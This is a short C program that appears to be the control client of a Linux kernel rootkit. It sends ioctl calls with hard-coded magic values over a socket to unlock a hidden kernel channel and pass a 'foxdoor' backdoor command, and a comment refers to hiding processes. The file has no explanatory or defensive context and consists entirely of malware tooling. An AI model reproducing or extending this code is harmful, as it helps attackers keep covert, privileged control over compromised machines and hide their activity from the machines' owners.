#include <arpa/inet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define SHELL "/bin/bash"

struct control {
	unsigned short cmd;
	void *argv;
};

int main(int argc, char **argv)
{
  
	int sockfd;
	int i;
	struct control args;
	struct sockaddr_in addr;
	struct hostent *host;
	unsigned int pid;
	unsigned char pid_ishide[5]; // zbh add (proc)
	char *bash = SHELL;
	char *envp[1] = {NULL};
	char *arg[3] = {SHELL, NULL};


	sockfd = socket(AF_INET, SOCK_STREAM, 6);

    args.cmd = 0;
    args.argv = "foxdoor 123 456\0";
    if (ioctl(sockfd, 0x634a5cb4, 0x3ff3876f) == 0) {
        ioctl(sockfd, 0x634a5cb4, &args);
        ioctl(sockfd, 0x634a5cb4, 0x3ff3876f);
    }
	return 0;
}
